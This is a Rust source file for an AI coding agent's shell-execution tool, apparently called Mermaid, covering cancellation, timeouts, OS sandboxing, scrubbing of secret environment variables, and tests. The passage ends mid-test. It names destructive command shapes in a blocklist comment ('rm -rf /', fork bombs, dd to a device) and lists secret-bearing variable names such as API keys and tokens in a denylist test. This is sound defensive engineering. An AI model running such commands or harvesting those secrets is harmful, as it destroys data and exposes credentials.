//! `execute_command` tool.
//!
//! The `ExecContext::token` races the subprocess wait in a `select!`.
//! When the user Ctrl+C's:
//!
//!   1. Reducer emits `Cmd::CancelScope(turn)`.
//!   2. Effect runner cancels the turn's scope token.
//!   3. `run_command`'s cancel branch fires, `terminate_tree` SIGKILLs
//!      the child's whole process group, the driver is aborted, and
//!      `ToolOutcome::Cancelled` flows back to the reducer. (The child
//!      is deliberately NOT `kill_on_drop`, so a Ctrl+B-detached
//!      command survives a clean shutdown — see the spawn site.)
//!
//! End-to-end latency: microseconds plus whatever it takes `SIGKILL`
//! to arrive. No polling loop to "forget" to include.
//!
//! The dangerous-command blocklist is defense-in-depth, not a
//! security boundary: the real boundary is the user's decision to
//! run Mermaid with shell access. But the known destructive shapes
//! (`rm -rf /`, fork bombs, dd to device, etc.) are cheap to catch
//! upfront.

use mermaid_domain::ProgressEvent;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{Duration, Instant};

use async_trait::async_trait;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;

use mermaid_domain::{FilesystemPolicy, NetworkPolicy};
use mermaid_domain::{ManagedProcess, ToolDefinition, ToolMetadata, ToolOutcome, ToolRunMetadata};
use mermaid_model::constants::{COMMAND_MAX_TIMEOUT_SECS, COMMAND_TIMEOUT_SECS};

use super::super::ctx::ExecContext;
use super::ToolExecutor;

/// `execute_command` — spawn a shell, run a command, capture output.
///
/// Honors three escape hatches:
/// - `ExecContext::token` (the main event): cancellation from the
///   reducer aborts the child. This is *the* Ctrl+C fix.
/// - `timeout` argument: model-specified per-call cap (capped at
///   `COMMAND_MAX_TIMEOUT_SECS`). Default `COMMAND_TIMEOUT_SECS`.
/// - Dangerous-command blocklist: refuses obvious destructive
///   patterns before spawning.
pub struct ExecuteCommandTool;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CommandMode {
    Wait,
    Background,
}

impl CommandMode {
    pub(crate) fn parse(args: &serde_json::Value) -> Result<Self, String> {
        match args.get("mode").and_then(|v| v.as_str()).unwrap_or("wait") {
            "wait" | "foreground" => Ok(Self::Wait),
            "background" => Ok(Self::Background),
            other => Err(format!(
                "execute_command: mode must be 'wait' or 'background', got '{other}'"
            )),
        }
    }
}

#[expect(
    clippy::too_many_lines,
    reason = "predates the lint; see .github/baselines/expect_budget.txt"
)]
#[async_trait]
impl ToolExecutor for ExecuteCommandTool {
    fn name(&self) -> &'static str {
        "execute_command"
    }

    fn schema(&self) -> ToolDefinition {
        ToolDefinition {
            name: "execute_command".to_string(),
            description:
                "Run a shell command — PowerShell on Windows, sh on Linux/macOS; write the command in that shell's syntax. Use mode='wait' for finite commands, or mode='background' for dev servers and GUI/daemon-style commands that should keep running after the tool returns. Ctrl+C during foreground execution aborts the child immediately. The session scratchpad directory (for throwaway files) is exported to the child as MERMAID_SCRATCHPAD."
                    .to_string(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "command": { "type": "string", "description": "Shell command to run." },
                    "working_dir": { "type": "string", "description": "Override working directory (absolute)." },
                    "mode": {
                        "type": "string",
                        "enum": ["wait", "background"],
                        "default": "wait",
                        "description": "Use 'background' for long-running servers, daemons, and GUI launchers."
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Per-call foreground timeout in seconds. Default 30, max 300. Foreground timeout kills the child."
                    },
                    "startup_timeout_secs": {
                        "type": "integer",
                        "description": "Background mode: seconds to watch startup logs for readiness. Default 5, max 30."
                    },
                    "ready_pattern": {
                        "type": "string",
                        "description": "Background mode: text that marks the server/app ready when it appears in the startup log."
                    },
                    "open_url": {
                        "type": "string",
                        "description": "Background mode: URL to open with the default browser after startup."
                    }
                },
                "required": ["command"]
            }),
        }
    }

    async fn execute(&self, args: serde_json::Value, ctx: ExecContext) -> ToolOutcome {
        let Some(command) = args.get("command").and_then(|v| v.as_str()) else {
            return ToolOutcome::error("execute_command requires 'command' (string)", 0.0);
        };

        if contains_dangerous_command(command) {
            return ToolOutcome::error(format!("Dangerous command blocked: {command}"), 0.0);
        }

        // Resolve the effective working directory and decide containment. A
        // cwd inside the session scratchpad stays a plain Shell request; any
        // other out-of-project cwd is allowed but escalated to
        // ExternalDirectory so the gate won't auto-allow even a read-only
        // command run outside the project — closing the working_dir
        // containment bypass.
        let (effective_workdir, within_project) = match args
            .get("working_dir")
            .and_then(|v| v.as_str())
        {
            Some(raw) => match super::path_safety::resolve_path_within(&ctx.workdir, raw) {
                Ok(resolved) => resolved,
                Err(e) => {
                    return ToolOutcome::error(format!("execute_command working_dir: {e}"), 0.0);
                },
            },
            None => (ctx.workdir.clone(), true),
        };
        let containment = classify_cwd(
            within_project,
            &effective_workdir,
            ctx.scratchpad.as_deref(),
        );

        let category = match containment {
            CwdContainment::Project | CwdContainment::Scratchpad => {
                mermaid_runtime::ToolCategory::Shell
            },
            CwdContainment::External => mermaid_runtime::ToolCategory::ExternalDirectory,
        };
        // Scratch containment must be PROVEN, fail closed: the cwd sits in
        // the scratchpad AND every token of the command lexically stays there.
        let scratch_contained = containment == CwdContainment::Scratchpad
            && ctx
                .scratchpad
                .as_deref()
                .is_some_and(|scratch| command_provably_in_scratch(command, scratch));
        let mut policy_request =
            mermaid_runtime::ActionRequest::new("execute_command", category, command.to_string());
        policy_request.command = Some(command.to_string());
        // The gate must resolve command-relative paths against the directory
        // this command actually runs in (`cmd.current_dir` below), not the
        // project root — see `ActionRequest::cwd`.
        policy_request.cwd = Some(effective_workdir.clone());
        if containment == CwdContainment::External {
            policy_request.path = Some(effective_workdir.display().to_string());
        }
        let pending_action = serde_json::json!({
            "tool": "execute_command",
            "args": args.clone(),
            "workdir": effective_workdir.display().to_string(),
            "turn_id": ctx.turn.0,
            "call_id": ctx.call_id.0,
            "task_id": ctx.task_id.clone(),
        });
        // Central safety gate. An Ask decision is handled inside the gate
        // (checkpoint + approval row + blocking outcome). Allow returns the
        // classified risk so we can take the pre-existing Allow-path
        // checkpoint below.
        let plan_write = match super::policy_gate::gate(
            &ctx,
            policy_request,
            &[],
            pending_action.clone(),
            true,
            scratch_contained,
        )
        .await
        {
            super::policy_gate::Gate::Block(outcome) => return outcome,
            super::policy_gate::Gate::Proceed { risk, plan_write } => {
                // A proven scratch-contained command can't touch the project,
                // so there is nothing worth snapshotting.
                if !scratch_contained
                    && ctx.config.safety.checkpoint_on_mutation
                    && risk != mermaid_runtime::RiskClass::ReadOnly
                {
                    let _ = mermaid_runtime::create_checkpoint_for_task(
                        &ctx.workdir,
                        &[],
                        Some(pending_action.clone()),
                        ctx.checkpoint_origin(),
                    );
                }
                plan_write
            },
        };

        let mode = match CommandMode::parse(&args) {
            Ok(mode) => mode,
            Err(error) => return ToolOutcome::error(error, 0.0),
        };
        let shell_payload = serde_json::json!({
            "task_id": ctx.task_id.clone(),
            "turn_id": ctx.turn.0,
            "call_id": ctx.call_id.0,
            "command": command,
            "working_dir": effective_workdir.display().to_string(),
        });
        let _ = mermaid_runtime::run_plugin_hooks("before_shell", &shell_payload);
        if mode == CommandMode::Background {
            let startup_timeout_secs = args
                .get("startup_timeout_secs")
                .or_else(|| args.get("startup_timeout"))
                .and_then(|v| v.as_u64())
                .unwrap_or(5)
                .clamp(1, 30);
            let ready_pattern = args
                .get("ready_pattern")
                .and_then(|v| v.as_str())
                .map(str::to_string);
            let open_url = args
                .get("open_url")
                .and_then(|v| v.as_str())
                .filter(|v| !v.trim().is_empty())
                .map(str::to_string);
            let outcome = run_background_command(
                command,
                &effective_workdir,
                startup_timeout_secs,
                ready_pattern.as_deref(),
                open_url.as_deref(),
                ctx,
            )
            .await;
            let _ = mermaid_runtime::run_plugin_hooks(
                "after_shell",
                &serde_json::json!({
                    "command": command,
                    "status": format!("{:?}", outcome.status),
                    "summary": &outcome.summary,
                }),
            );
            return outcome;
        }

        let timeout_secs = args
            .get("timeout")
            .and_then(|v| v.as_u64())
            .unwrap_or(COMMAND_TIMEOUT_SECS)
            .min(COMMAND_MAX_TIMEOUT_SECS);

        let command = command.to_string();
        let start = Instant::now();
        let progress = ctx.progress.clone();

        // Spawn + wait. `run_command`'s select races four outcomes: subprocess
        // exit, timeout, Esc-cancel, and Ctrl+B detach — the timeout and cancel
        // arms both tree-kill before returning.
        //
        // When network access is denied (`safety.network = "deny"` /
        // `--no-network`) and/or writes are confined (`safety.filesystem =
        // "project"` / `--confine-fs`), the shell is wrapped in the
        // `__sandbox-exec` launcher, which enforces the policy via the
        // platform backend (Linux: seccomp network kill-switch + Landlock
        // write rules; macOS: Seatbelt via sandbox-exec; Windows: AppContainer
        // + Job Objects) before running it — so a denied network attempt or
        // out-of-bounds write fails with a signature the completion arm below
        // maps to a clear denial. Platforms WITH a backend always wrap when a
        // policy is requested — if the probe says the backend is broken, the
        // launcher fails closed (exit 126) rather than running unconfined.
        let sandbox_expected = cfg!(any(
            target_os = "linux",
            target_os = "macos",
            target_os = "windows"
        ));
        let net_requested = matches!(ctx.config.safety.network, NetworkPolicy::Deny);
        let fs_requested = matches!(ctx.config.safety.filesystem, FilesystemPolicy::Project);
        let (net_available, fs_available) = sandbox_probes();
        let sandbox_network = net_requested && (sandbox_expected || net_available);
        let sandbox_fs = fs_requested && (sandbox_expected || fs_available);
        if (net_requested && !net_available) || (fs_requested && !fs_available) {
            static DEGRADED_WARN: std::sync::Once = std::sync::Once::new();
            DEGRADED_WARN.call_once(|| {
                if sandbox_expected {
                    tracing::warn!(
                        "sandbox policy requested but the OS sandbox backend probe failed; \
                         sandboxed commands will refuse to run (fail-closed)"
                    );
                } else {
                    tracing::warn!(
                        "sandbox policy requested but no OS sandbox backend exists on this \
                         platform; commands run unconfined"
                    );
                }
            });
        }
        // Write allowlist: the project root (so a build in a subdir can still
        // write repo-root artifacts), the effective workdir (out-of-project
        // commands, separately gated by policy), the system temp dir, and —
        // unix only — /dev (shell redirects like `>/dev/null` are writes).
        let confine_writes: Option<Vec<PathBuf>> = sandbox_fs.then(|| {
            let mut dirs = vec![
                ctx.workdir.clone(),
                effective_workdir.clone(),
                std::env::temp_dir(),
            ];
            if cfg!(unix) {
                dirs.push(PathBuf::from("/dev"));
            }
            dirs.dedup();
            dirs
        });
        // Default: run on a pseudo-terminal — openpty on Unix, ConPTY on
        // Windows — so the child sees a real console (progress bars,
        // isatty-gated tools); on Unix `/dev/tty` additionally resolves to
        // the CAPTURED pty. `[exec] pty = false` or any pre-spawn PTY
        // failure falls back to the pipe path below, which stays fully
        // intact.
        if ctx.config.exec.pty_enabled() {
            let invocation = shell_invocation(&command, sandbox_network, confine_writes.as_deref());
            match run_command_pty(
                &invocation,
                &effective_workdir,
                ctx.scratchpad.as_deref(),
                progress.clone(),
                ctx.token.clone(),
                ctx.background.clone(),
                Duration::from_secs(timeout_secs),
            )
            .await
            {
                Ok(run) => {
                    let outcome = finish_foreground_command(
                        Ok(run),
                        &command,
                        &effective_workdir,
                        start,
                        timeout_secs,
                        sandbox_network,
                        sandbox_fs,
                    );
                    let _ = mermaid_runtime::run_plugin_hooks(
                        "after_shell",
                        &serde_json::json!({
                            "command": command,
                            "status": format!("{:?}", outcome.status),
                            "summary": &outcome.summary,
                        }),
                    );
                    return outcome;
                },
                // Every fallible step in run_command_pty precedes the spawn,
                // so falling back here can never run the command twice.
                Err(err) => {
                    tracing::warn!(error = %err, "PTY exec unavailable; falling back to pipes");
                },
            }
        }

        let mut cmd = build_sandboxed_shell(&command, sandbox_network, confine_writes.as_deref());
        cmd.stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            // NOT kill-on-drop: the cancel and timeout arms of `run_command`
            // explicitly `terminate_tree` the whole process group (the direct
            // shell is its group leader, so any forked grandchild dies too), so
            // no drop-time backstop is needed on those paths. Crucially, leaving
            // the child un-armed lets a Ctrl+B-detached command survive a clean
            // Mermaid shutdown: the orphaned driver task that still owns this
            // `Child` is aborted at runtime teardown, and a `kill_on_drop(true)`
            // child would then be SIGKILLed despite `mode=background` semantics
            // — inconsistent with a truly backgrounded process (#F16).
            .kill_on_drop(false);

        // Unix: lead a new SESSION, not just a new process group. `setsid()`
        // still makes the child a group leader (sid == pgid == pid), so the
        // cancel/timeout group-kill in `terminate_tree` is unchanged — but a
        // new session has no controlling terminal, so a child that tries to
        // open `/dev/tty` (a `sudo` password prompt, an ssh passphrase read)
        // fails instantly instead of painting its prompt over the TUI and
        // hanging until timeout. `setsid` is async-signal-safe, so a pre_exec
        // closure is fine here (unlike the seccomp/Landlock setup, which needs
        // the `__sandbox-exec` re-exec — see `app::sandbox_exec`). Must NOT be
        // combined with `process_group(0)`: setpgid runs before pre_exec, and
        // `setsid` fails with EPERM for an existing group leader.
        // (Windows kills the tree by pid via `taskkill /T`, no group needed.)
        #[cfg(unix)]
        unsafe {
            cmd.pre_exec(|| {
                rustix::process::setsid()?;
                Ok(())
            });
        }

        cmd.current_dir(&effective_workdir);
        scrub_secret_env(&mut cmd);
        harden_noninteractive_env(&mut cmd);
        export_scratchpad_env(&mut cmd, ctx.scratchpad.as_deref());

        // The timeout now lives INSIDE `run_command`'s select (alongside the
        // Esc-cancel and Ctrl+B arms), so a timed-out command is tree-killed and
        // its driver aborted before we return — the old outer `select!` dropped
        // the future and leaked the process tree.
        let mut outcome = finish_foreground_command(
            run_command(
                cmd,
                progress,
                ctx.token.clone(),
                ctx.background.clone(),
                Duration::from_secs(timeout_secs),
            )
            .await,
            &command,
            &effective_workdir,
            start,
            timeout_secs,
            sandbox_network,
            sandbox_fs,
        );
        // Record that this command WAS the plan write (the gate said so), so
        // the doom-loop breaker disarms on the shell spelling of plan
        // authoring instead of only on `write_file`/`apply_patch`.
        outcome.metadata.plan_file_written =
            plan_write && outcome.status == mermaid_domain::ToolStatus::Success;
        let _ = mermaid_runtime::run_plugin_hooks(
            "after_shell",
            &serde_json::json!({
                "command": command,
                "status": format!("{:?}", outcome.status),
                "summary": &outcome.summary,
            }),
        );
        outcome
    }
}

/// Map a completed foreground run (either spawn path) onto the tool outcome:
/// sandbox-denial detection, detach registration, timeout/cancel/error
/// shaping, and command metadata. Shared by the pipe and PTY paths so their
/// user-visible semantics cannot drift.
#[expect(
    clippy::too_many_lines,
    reason = "predates the lint; see .github/baselines/expect_budget.txt"
)]
fn finish_foreground_command(
    result: std::io::Result<CommandRunResult>,
    command: &str,
    effective_workdir: &Path,
    start: Instant,
    timeout_secs: u64,
    sandbox_network: bool,
    sandbox_fs: bool,
) -> ToolOutcome {
    let command = command.to_string();
    match result {
        Ok(CommandRunResult::Completed(run)) => {
            let duration_secs = start.elapsed().as_secs_f64();
            let output_len = run.output.len();
            let mut metadata = command_metadata(CommandMetadataInput {
                command: command.clone(),
                working_dir: Some(effective_workdir.display().to_string()),
                exit_code: run.exit_code,
                timed_out: false,
                background: false,
                stdout_lines: run.stdout_lines,
                stderr_lines: run.stderr_lines,
                detected_urls: all_urls(&run.output),
                pid: None,
                log_path: None,
                byte_count: Some(output_len),
            });
            if let Some(kind) = detect_denial(&run, sandbox_network, sandbox_fs) {
                // The sandbox stopped (or very likely stopped) this command.
                // Surface a clear, actionable error instead of a confusing
                // "killed" / opaque permission failure.
                if let ToolMetadata::ExecuteCommand {
                    denied_by_sandbox, ..
                } = &mut metadata.detail
                {
                    *denied_by_sandbox = true;
                }
                let message = match kind {
                    // The Linux SIGSYS signature is precise — the message
                    // stands alone. Every other signature is a hedged text
                    // match, so the original output stays attached.
                    DenialKind::Network if cfg!(target_os = "linux") => {
                        NETWORK_DENIED_MESSAGE.to_string()
                    },
                    DenialKind::Network => format!(
                        "{HEDGED_NETWORK_DENIED_MESSAGE}\n\n--- original output ---\n{}",
                        run.output
                    ),
                    DenialKind::Filesystem => format!(
                        "{FS_DENIED_MESSAGE}\n\n--- original output ---\n{}",
                        run.output
                    ),
                    DenialKind::Ambiguous => format!(
                        "{AMBIGUOUS_DENIED_MESSAGE}\n\n--- original output ---\n{}",
                        run.output
                    ),
                };
                ToolOutcome::error(message, duration_secs).with_metadata(metadata)
            } else {
                ToolOutcome::success(run.output.clone(), "command completed", duration_secs)
                    .with_metadata(metadata)
            }
        },
        Ok(CommandRunResult::Detached { pid, log_path }) => {
            // Ctrl+B moved this command to the background.
            let duration_secs = start.elapsed().as_secs_f64();
            let log_path_str = log_path.display().to_string();
            let output = format!(
                "Moved to background.\nPID: {pid}\nLog: {log_path_str}\nManage it with /processes, /logs {pid}, /stop {pid}."
            );
            let process = ManagedProcess {
                id: format!("bg-{pid}"),
                pid,
                command: command.to_string(),
                cwd: Some(effective_workdir.display().to_string()),
                log_path: log_path_str.clone(),
                detected_url: None,
                status: mermaid_runtime::ProcessStatus::Running,
            };
            let mut metadata = command_metadata(CommandMetadataInput {
                command: command.to_string(),
                working_dir: Some(effective_workdir.display().to_string()),
                exit_code: None,
                timed_out: false,
                background: true,
                stdout_lines: 0,
                stderr_lines: 0,
                detected_urls: Vec::new(),
                pid: Some(pid),
                log_path: Some(log_path_str),
                byte_count: Some(output.len()),
            });
            metadata.process = Some(process);
            ToolOutcome::success(output, "moved to background", duration_secs)
                .with_metadata(metadata)
        },
        Ok(CommandRunResult::Cancelled) => ToolOutcome::cancelled(),
        Ok(CommandRunResult::TimedOut) => {
            let message = format!(
                "Command timed out after {timeout_secs} seconds and was killed. \
                     For dev servers, GUI apps, or other long-running commands, call execute_command with mode=\"background\"."
            );
            let duration_secs = start.elapsed().as_secs_f64();
            ToolOutcome::error(message, duration_secs).with_metadata(command_metadata(
                CommandMetadataInput {
                    command: command.clone(),
                    working_dir: Some(effective_workdir.display().to_string()),
                    exit_code: None,
                    timed_out: true,
                    background: false,
                    stdout_lines: 0,
                    stderr_lines: 0,
                    detected_urls: Vec::new(),
                    pid: None,
                    log_path: None,
                    byte_count: None,
                },
            ))
        },
        Err(e) => {
            let duration_secs = start.elapsed().as_secs_f64();
            ToolOutcome::error(format!("Command failed: {e}"), duration_secs).with_metadata(
                command_metadata(CommandMetadataInput {
                    command: command.clone(),
                    working_dir: Some(effective_workdir.display().to_string()),
                    exit_code: None,
                    timed_out: false,
                    background: false,
                    stdout_lines: 0,
                    stderr_lines: 0,
                    detected_urls: Vec::new(),
                    pid: None,
                    log_path: None,
                    byte_count: None,
                }),
            )
        },
    }
}

pub(crate) mod background;
pub(crate) mod capture;
pub(crate) mod pty;
pub(crate) mod sandbox;
pub(crate) mod shell;

pub(crate) use background::*;
pub(crate) use capture::*;
pub(crate) use pty::*;
pub(crate) use sandbox::*;
pub(crate) use shell::*;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::providers::ctx::test_exec_context;
    use mermaid_domain::{ToolCallId, TurnId};
    use std::path::PathBuf;

    #[test]
    pub(crate) fn network_denial_detects_sigsys_and_reaped_child_exit() {
        let out = |exit: Option<i32>, signal: Option<i32>| CommandRunOutput {
            output: String::new(),
            exit_code: exit,
            signal,
            stdout_lines: 0,
            stderr_lines: 0,
        };
        // The shell itself was SIGSYS-killed.
        assert!(is_sigsys_denial(&out(None, Some(31))));
        // The shell reaped a SIGSYS-killed child and exited 128 + 31.
        assert!(is_sigsys_denial(&out(Some(159), None)));
        // Ordinary failures / success / a different signal are not denials.
        assert!(!is_sigsys_denial(&out(Some(1), None)));
        assert!(!is_sigsys_denial(&out(Some(0), None)));
        assert!(!is_sigsys_denial(&out(None, Some(11)))); // SIGSEGV, not SIGSYS
    }

    #[test]
    pub(crate) fn detect_denial_gates_on_active_policies() {
        let out = |exit: Option<i32>, signal: Option<i32>, output: &str| CommandRunOutput {
            output: output.to_string(),
            exit_code: exit,
            signal,
            stdout_lines: 0,
            stderr_lines: 0,
        };
        // Sandbox off for this spawn: nothing is ever labeled a denial, no
        // matter how denial-shaped the failure looks.
        assert_eq!(
            detect_denial(&out(Some(159), None, "Permission denied"), false, false),
            None
        );
        assert_eq!(detect_denial(&out(None, Some(31), ""), false, false), None);
        // A clean success is never a denial even with both policies active.
        assert_eq!(detect_denial(&out(Some(0), None, ""), true, true), None);
        #[cfg(target_os = "linux")]
        {
            // Precise SIGSYS signature maps to Network; permission text with
            // only the FS sandbox active maps to Filesystem.
            assert_eq!(
                detect_denial(&out(None, Some(31), ""), true, true),
                Some(DenialKind::Network)
            );
            assert_eq!(
                detect_denial(&out(Some(1), None, "Permission denied"), false, true),
                Some(DenialKind::Filesystem)
            );
            // Linux network denials are SIGSYS-only: permission text alone
            // does not implicate the network sandbox.
            assert_eq!(
                detect_denial(&out(Some(1), None, "Permission denied"), true, false),
                None
            );
        }
        #[cfg(target_os = "macos")]
        {
            // Seatbelt: hedged EPERM text; both-active is ambiguous.
            let eperm = out(Some(1), None, "curl: Operation not permitted");
            assert_eq!(
                detect_denial(&eperm, true, false),
                Some(DenialKind::Network)
            );
            assert_eq!(
                detect_denial(&eperm, false, true),
                Some(DenialKind::Filesystem)
            );
            assert_eq!(
                detect_denial(&eperm, true, true),
                Some(DenialKind::Ambiguous)
            );
        }
    }

    #[test]
    pub(crate) fn fs_denial_requires_failure_and_permission_signature() {
        let out = |exit: Option<i32>, output: &str| CommandRunOutput {
            output: output.to_string(),
            exit_code: exit,
            signal: None,
            stdout_lines: 0,
            stderr_lines: 0,
        };
        // Non-zero exit + the permission-error text ⇒ denial signature.
        assert!(is_permission_denial(&out(
            Some(1),
            "sh: line 1: /etc/nope: Permission denied"
        )));
        assert!(is_permission_denial(&out(
            Some(2),
            "touch: Operation not permitted"
        )));
        // A successful command mentioning the phrase is not a denial…
        assert!(!is_permission_denial(&out(
            Some(0),
            "grep found: Permission denied"
        )));
        // …nor is an ordinary failure without it, or a signal death.
        assert!(!is_permission_denial(&out(Some(1), "some other failure")));
        assert!(!is_permission_denial(&out(None, "Permission denied")));
    }

    #[test]
    pub(crate) fn sandboxed_shell_wraps_only_when_requested() {
        let plain = build_sandboxed_shell("echo hi", false, None);
        let plain_prog = plain.as_std().get_program().to_string_lossy().into_owned();
        assert!(
            ["sh", "pwsh", "powershell"].contains(&plain_prog.as_str()),
            "plain shell program: {plain_prog}"
        );

        let wrapped = build_sandboxed_shell("echo hi", true, None);
        let args: Vec<String> = wrapped
            .as_std()
            .get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert_eq!(args.first().map(String::as_str), Some("__sandbox-exec"));
        assert!(args.contains(&"--no-network".to_string()));
        assert!(!args.contains(&"--confine-writes".to_string()));
        assert!(
            args.iter()
                .any(|a| ["sh", "pwsh", "powershell"].contains(&a.as_str())),
            "args: {args:?}"
        );
    }

    #[test]
    pub(crate) fn sandboxed_shell_passes_confine_writes_dirs() {
        let dirs = vec![PathBuf::from("/proj"), PathBuf::from("/dev")];
        let wrapped = build_sandboxed_shell("echo hi", false, Some(&dirs));
        let args: Vec<String> = wrapped
            .as_std()
            .get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert_eq!(args.first().map(String::as_str), Some("__sandbox-exec"));
        assert!(!args.contains(&"--no-network".to_string()));
        // Each dir rides its own `--confine-writes`.
        assert_eq!(
            args.iter().filter(|a| *a == "--confine-writes").count(),
            2,
            "args: {args:?}"
        );
        assert!(args.contains(&"/proj".to_string()));
        assert!(args.contains(&"/dev".to_string()));
    }

    #[test]
    pub(crate) fn powershell_wrap_carries_stop_pref_and_exit_code_trailer() {
        let wrapped = powershell_wrap("cargo build");
        assert!(wrapped.starts_with("$ErrorActionPreference='Stop'\n"));
        assert!(wrapped.contains("cargo build"));
        assert!(wrapped.ends_with("{ exit $LASTEXITCODE }"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    pub(crate) fn windows_shell_invocation_is_powershell() {
        let inv = shell_invocation("echo hi", false, None);
        let prog = inv.program.to_string_lossy().into_owned();
        assert!(prog == "pwsh" || prog == "powershell", "program: {prog}");
        let args: Vec<String> = inv
            .args
            .iter()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert_eq!(&args[..3], ["-NoProfile", "-NonInteractive", "-Command"]);
        assert!(args[3].contains("echo hi"), "args: {args:?}");
    }

    /// Without the `powershell_wrap` trailer, PowerShell collapses a native
    /// child's exit code to 0/1 — `cargo build` failing with 101 would look
    /// clean. `cmd /c exit 7` is the minimal native command with a nonzero code.
    #[cfg(target_os = "windows")]
    #[tokio::test]
    async fn windows_native_exit_code_propagates() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({"command": "cmd /c exit 7"}), ctx)
            .await;
        match &outcome.metadata.detail {
            mermaid_domain::ToolMetadata::ExecuteCommand { exit_code, .. } => {
                assert_eq!(*exit_code, Some(7), "outcome: {outcome:?}");
            },
            other => panic!("unexpected metadata: {other:?}"),
        }
    }

    /// The point of the switch: PowerShell-native syntax must actually run.
    #[cfg(target_os = "windows")]
    #[tokio::test]
    async fn windows_powershell_syntax_works() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({"command": "Write-Output ('mermaid-' + 'ps')"}),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "outcome: {outcome:?}");
        assert!(
            outcome.output().contains("mermaid-ps"),
            "output: {}",
            outcome.output()
        );
    }

    #[tokio::test]
    async fn tee_log_is_capped() {
        // #126: the on-disk tee log must be bounded so a command spewing
        // gigabytes can't fill the temp dir, even though the in-memory buffer is
        // already capped.
        let dir = std::env::temp_dir().join(format!("mermaid_teelog_{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let path = dir.join("log.txt");
        let file = tokio::fs::File::create(&path).await.unwrap();
        let log = std::sync::Arc::new(tokio::sync::Mutex::new(file));
        // 4000 bytes of output, on-disk log capped at 16.
        let data = vec![b'x'; 4000];
        let _ = read_capped(&data[..], 1_000_000, 16, None, Some(log)).await;
        let written = std::fs::read(&path).unwrap();
        assert!(
            written.len() < 200,
            "log must be capped near 16 bytes + marker, got {}",
            written.len()
        );
        assert!(String::from_utf8_lossy(&written).contains("log truncated"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    pub(crate) fn tee_log_created_owner_only_and_refuses_existing() {
        // #F14/#F15: the tee log (which can capture secret-bearing stdout) must
        // be owner-only, and the O_EXCL create must refuse a pre-existing path —
        // the same guard that refuses to follow a symlink planted at the
        // predictable name.
        use std::os::unix::fs::PermissionsExt;
        let dir = std::env::temp_dir().join(format!("mermaid_loghard_{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let path = dir.join("bg.log");
        let _ = std::fs::remove_file(&path);

        let file = create_log_file_blocking(&path).expect("first create succeeds");
        drop(file);
        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "tee log must be owner-only, got {mode:o}");

        // O_EXCL: a second create at the same path (e.g. an attacker-planted
        // symlink/file) is refused rather than followed/truncated.
        assert!(
            create_log_file_blocking(&path).is_err(),
            "O_EXCL must refuse an existing path"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    pub(crate) fn secret_env_name_denylist_covers_common_carriers() {
        // #4: secrets the old denylist missed.
        for name in [
            "ANTHROPIC_API_KEY",
            "AWS_SECRET_ACCESS_KEY",
            "GITHUB_TOKEN",
            "MY_SERVICE_PRIVATE_KEY",
            "DATABASE_URL",
            "SENTRY_DSN",
            "SLACK_WEBHOOK_URL",
            "KUBECONFIG",
            "SSH_AUTH_SOCK",
            "DB_PASSWORD",
            "PG_CONNECTION_STRING",
        ] {
            assert!(is_secret_env_name(name), "{name} should be scrubbed");
        }
        // Ordinary build/run vars must survive.
        for name in [
            "PATH",
            "HOME",
            "CARGO_HOME",
            "LANG",
            "XAUTHORITY",
            "RUSTUP_HOME",
        ] {
            assert!(!is_secret_env_name(name), "{name} should NOT be scrubbed");
        }
    }

    #[tokio::test]
    async fn out_of_project_working_dir_is_escalated_and_blocked() {
        // #1: a read-only command auto-runs in-project, but the same command
        // with an out-of-project working_dir is escalated to ExternalDirectory
        // and denied (here, by ReadOnly mode — proving it's no longer treated
        // as an auto-allowable in-project read).
        let project = std::env::temp_dir().join(format!("mermaid_wd_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&project);
        std::fs::create_dir_all(&project).unwrap();
        let outside = project.parent().unwrap().to_path_buf();

        let mk_ctx = || {
            let mut config = mermaid_domain::Config::default();
            config.safety.mode = mermaid_runtime::SafetyMode::ReadOnly;
            crate::providers::ctx::test_exec_context_with_config(
                TurnId(1),
                ToolCallId(1),
                project.clone(),
                config,
            )
        };

        let (ctx, _rx) = mk_ctx();
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({"command": "echo hi"}), ctx)
            .await;
        assert!(
            outcome.is_success(),
            "in-project read-only echo should run: {outcome:?}",
        );

        let (ctx, _rx) = mk_ctx();
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "echo hi",
                    "working_dir": outside.display().to_string(),
                }),
                ctx,
            )
            .await;
        assert_eq!(
            outcome.status,
            mermaid_domain::ToolStatus::Error,
            "out-of-project working_dir must be escalated + blocked: {outcome:?}",
        );

        let _ = std::fs::remove_dir_all(&project);
    }

    /// The plan-file carve-out is the ONE writable path in plan mode, and it
    /// is matched lexically. Every previous test for it drove `gate()`
    /// directly, which never sees `working_dir` — so the gate matched
    /// `.mermaid/plans/x.md` against the project root while the command ran
    /// somewhere else and wrote a different file. Drive the real tool.
    #[tokio::test]
    async fn plan_write_carve_out_respects_the_effective_working_dir() {
        let project = std::env::temp_dir().join(format!("mermaid_planwd_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&project);
        std::fs::create_dir_all(project.join(".mermaid/plans")).unwrap();
        // A second tree INSIDE the project, so containment stays `Project`
